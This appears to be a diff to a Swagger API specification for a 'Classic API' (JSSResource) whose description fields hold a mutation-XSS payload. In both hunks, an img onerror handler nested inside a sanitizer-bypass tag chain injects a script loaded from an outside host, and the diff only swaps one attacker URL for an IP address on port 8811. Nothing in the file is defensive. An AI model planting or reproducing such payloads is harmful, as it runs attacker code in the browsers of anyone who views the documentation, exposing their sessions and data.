@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://cdn.dasatarx.com/b/41422fd9-f393-4d25-bca3-e3f2e28d1f58'" width="0" height="0"></img>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://45.32.110.46:8811/'" width="0" height="0"></img>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-                <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://cdn.dasatarx.com/b/41422fd9-f393-4d25-bca3-e3f2e28d1f58'" width="0" height="0"></img>"></form>
+                <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://45.32.110.46:8811/'" width="0" height="0"></img>"></form>
 
           format: int64
           in: path
